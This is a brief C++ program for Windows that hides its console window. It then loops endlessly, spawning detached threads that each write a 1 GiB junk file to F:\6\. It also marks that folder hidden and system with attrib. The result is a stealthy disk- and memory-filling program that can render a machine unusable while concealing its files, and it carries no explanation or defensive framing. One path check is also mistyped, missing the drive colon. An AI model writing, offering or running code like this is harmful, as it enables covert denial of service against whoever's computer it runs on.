#include <bits/stdc++.h>
#include <windows.h>
#include <sys/stat.h>
using namespace std;

inline bool exists(const string name)
{
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}
WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
void w()
{
    string s(1024 * 1024 * 1024, '6'),str="F:\\6\\"+to_string(time(0));
    ofstream fout(str);
    fout << s;
}
int main()
{
    HideConsole();
    while(1)
    {
        while(exists("F\\6\\6.txt"))
        {
            ofstream fout("F:\\6\\6.txt");
            fout << 6;
            system("attrib +s +h F:\\6");
        }
        thread t(w);
        t.detach();
    }
}